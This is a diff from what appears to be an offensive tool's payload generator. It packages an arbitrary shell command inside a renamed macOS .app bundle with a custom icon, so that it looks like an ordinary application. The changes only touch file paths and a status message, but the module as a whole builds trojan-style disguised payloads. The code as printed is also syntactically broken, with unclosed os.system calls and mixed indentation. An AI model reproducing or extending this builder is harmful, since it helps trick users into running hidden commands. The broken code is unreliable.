@@ -27,11 +27,13 @@ class payload:
 			os.mkdir("payloads/macos_application")
                         os.system("""
 cp resources/application.app payloads/macos_application
-mv payloads/macos_application/application.app payloads/macos_application/"""+name+""".app
 mv """+icon+""" payloads/"""+name+""".app/Contents/Resources/Powershell.icns
                         """
-		payload_save_path = "payloads/macos_application/"+name+".app/Contents/MacOS/PowerShell.sh"
-                sas = "payloads/macos_application/"+name
+		payload_save_path = "payloads/macos_application/application.app/Contents/MacOS/PowerShell.sh"
+                sas = "payloads/macos_application"
+		os.system("""
+mv payloads/macos_application/application.app payloads/macos_application/"""+name+""".app
+		"""
 		payload = """\
 #! /usr/local/bin/env bash
 """+shell_command+"""
@@ -39,6 +41,6 @@ mv """+icon+""" payloads/"""+name+""".app/Contents/Resources/Powershell.icns
 		f = open(payload_save_path,"w")
 		f.write(payload)
 		f.close()
-		h.info_general("Payload saved to " + sas)
+		h.info_general("Application saved to " + sas + "folder")
 
 
